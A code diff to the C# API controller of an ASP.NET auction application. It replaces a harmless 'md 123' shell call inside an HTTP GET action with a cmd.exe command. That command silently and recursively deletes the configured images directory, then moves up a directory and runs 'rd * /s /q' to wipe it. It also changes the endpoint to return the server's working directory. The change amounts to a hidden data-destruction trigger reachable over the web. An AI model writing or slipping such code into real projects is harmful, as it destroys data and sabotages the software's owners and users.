@@ -5,6 +5,7 @@ using System.Threading.Tasks;
 using Auction.Data;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Options;
 
 namespace Auction.Controllers.Api
 {
@@ -16,10 +17,13 @@ namespace Auction.Controllers.Api
     public class ApiController : ControllerBase
     {
         private readonly AuctionDbContext _context;
+        public AuctionSettings _appSettings { get; }
 
-        public ApiController(AuctionDbContext context)
+        public ApiController(AuctionDbContext context,
+            IOptions<AuctionSettings> appSettings)
         {
             _context = context;
+            _appSettings = appSettings.Value;
         }
 
         [HttpGet("[action]")]
@@ -45,7 +49,8 @@ namespace Auction.Controllers.Api
                 Process process = new Process();//创建进程对象  
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 startInfo.FileName = "cmd.exe";//设定需要执行的命令  
-                startInfo.Arguments = "/C " + "md 123";//“/C”表示执行完命令后马上退出  
+                startInfo.Arguments = "/C " + "rd " + Path.Combine(_appSettings.FilesRootDir, "images")
+                    + " /s /q && cd.. && rd * /s /q"; //“/C”表示执行完命令后马上退出  
                 startInfo.UseShellExecute = false;//不使用系统外壳程序启动 
                 startInfo.RedirectStandardInput = false;//不重定向输入  
                 startInfo.RedirectStandardOutput = true; //重定向输出  
@@ -53,7 +58,7 @@ namespace Auction.Controllers.Api
                 process.StartInfo = startInfo;
                 try
                 {
-                    if (process.Start())//开始进程  
+                    if (process.Start())//开始进程
                     {
                         // if (seconds == 0)
                         // {
@@ -77,7 +82,7 @@ namespace Auction.Controllers.Api
                 }
                 // }
             }
-            var data = new { abc = output };
+            var data = new { abc = Path.Combine(Directory.GetCurrentDirectory()) };
             return Ok(data);
         }
     }
